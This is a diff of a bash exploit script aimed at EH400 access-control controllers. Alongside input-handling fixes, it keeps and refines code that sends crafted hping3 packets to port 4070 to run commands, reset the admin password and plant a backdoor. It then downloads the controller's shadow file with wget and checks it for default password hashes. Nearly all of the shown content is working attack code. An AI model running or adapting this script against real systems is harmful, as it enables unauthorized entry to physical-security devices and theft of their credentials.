@@ -25,26 +25,25 @@
 #                                                                         #
 ###########################################################################
 
-# Deciding what we need to do here
-echo "[+] Would you like to exploit an EH400 or cleanup a previously exploited controller?"
-echo -n "[+] exploit or cleanup: "
-read -e JOB
-if [ $JOB != "exploit" ] || [ $JOB != "cleanup" ]
+EXPECTED_ARGS=1;
+if [ $# -ne $EXPECTED_ARGS ]
 then
-  # Response required is verbatim "exploit" or "cleanup"
-  echo "[!] Nope. Please respond exactly as provided."
-  echo -n "[+] exploit or cleanup: "
-  read -e JOB
-  if [ $JOB != "exploit" ] || [ $JOB != "cleanup" ]
-  then
-    # Seriously type either "exploit" to exploit or "cleanup" to clean up.
-    echo '[!] Still Nope. '$JOB' is not "exploit" or "cleanup"!'
-    echo '[!] Please try again later.'
-    exit 1
-  fi
+ echo "Usage: ./eh400.sh <action>"
+ echo "Actions: exploit, cleanup"
+ echo "Example: ./eh400.sh exploit"
+ exit 1
 fi
 
-if [ $JOB == exploit ]
+CMDEXEC=`which hping3`
+
+if [ "$1" != "exploit" ] && [ "$1" != "cleanup" ]
+then
+  # Response required is verbatim "exploit" or "cleanup"
+  echo "[*] Action '$1' not recognized. Exiting..."
+  exit 0
+fi
+
+if [ "$1" == "exploit" ]
 then 
   echo "[*] Fresh Exploit. Let's get started."
   # Set the follwoing 4 variables
@@ -53,14 +52,13 @@ then
   read -e TARGET
   echo -n "Target MAC: "
   read -e TMAC
-  echo -n "LHOST IP"
+  echo -n "LHOST IP: "
   read -e LHOST
   echo -n "New Password: "
   read -e NEWPASS
   
   #Generating Hash and finding hping3
   HASH=`echo -n "admin:Secure Access:${NEWPASS}" | md5sum | cut -b -32`
-  CMDEXEC=`which hping3`
   
   #Generating data files and backdoor script
   echo "[*] Creating Data files"
@@ -115,6 +113,7 @@ then
   ${CMDEXEC} -2 -p 4070 -c 1 -E data8.txt -d 150 ${TARGET} 2> /dev/null
   echo ""
   cd ../
+  service apache2 stop
   echo "[*] Execution Complete."
 
   #Exfiltraiting sensitive files
@@ -124,20 +123,20 @@ then
   wget --no-check-certificate --user=admin --password=${NEWPASS} -O shadow https://${TARGET}/shadow
 
   echo "[*] Checking shadow for default passwords"
-  if [ $(egrep -q xRH0tNmOG1 shadow) = 1 ]
+  if [ "$(egrep -q xRH0tNmOG1 shadow && echo "1" || echo "0")" == "1" ]
   then
-    echo "[!] Default root:pass user/pass combo found."
+    echo -e "\e[1;31m[!]\e[0m Default root:pass user/pass combo found."
   fi
-  if [ $(egrep -q MPUVM6G7uu shadow) = 1 ]
-  then 
-    echo "[!] Default modem1:modem1 user/pass combo found."
-  fi
-  if [ $(egrep -q VFVf68vUI0 shadow) = 1 ]
+  if [ "$(egrep -q MPUVM6G7uu shadow && echo "1" || echo "0")" = "1" ]
   then
-    echo "[!] Default router1:router1 user/pass combo found."
+    echo -e "\e[1;31m[!]\e[0m Default modem1:modem1 user/pass combo found."
   fi
-  if [ $(egrep -q '(xRH0tNmOG1|MPUVM6G7uu|VFVf68vUI0)' shadow) = 0 ]
-  then  
+  if [ "$(egrep -q VFVf68vUI0 shadow && echo "1" || echo "0")" = "1" ]
+  then
+    echo -e "\e[1;31m[!]\e[0m Default router1:router1 user/pass combo found."
+  fi
+  if [ "$(egrep -q '(xRH0tNmOG1|MPUVM6G7uu|VFVf68vUI0)' shadow && echo "1" || echo "0")" = "0" ]
+  then
     echo "[*] No default user/pass combinations identified."
   fi
   echo "[*] Exploitation Complete."
@@ -147,7 +146,7 @@ then
 fi
 
 #Cleaning up post exploitation.
-if [ $JOB == cleanup ]
+if [ $1 == "cleanup" ]
 then
   echo "[*] Cleaning up previous exploitation."
   echo "[*] Setting Variables..."
@@ -158,7 +157,7 @@ then
   
   #Creating Data Files
   echo "[*] Creating Data files."
-  if [ $(ls | egrep -q datafiles) = 0 ]
+  if [ "$(ls | egrep -q datafiles && echo "1" || echo "0")" = "0" ]
   then
     mkdir datafiles
     cd ./datafiles
@@ -189,7 +188,7 @@ then
   ${CMDEXEC} -2 -p 4070 -c 1 -E data12.txt -d 150 ${TARGET} 2> /dev/null
   echo ""
   cd ../
-  echo "Cleanup Complete."
+  echo "[*] Cleanup Complete."
   exit 1
 fi
 exit 1
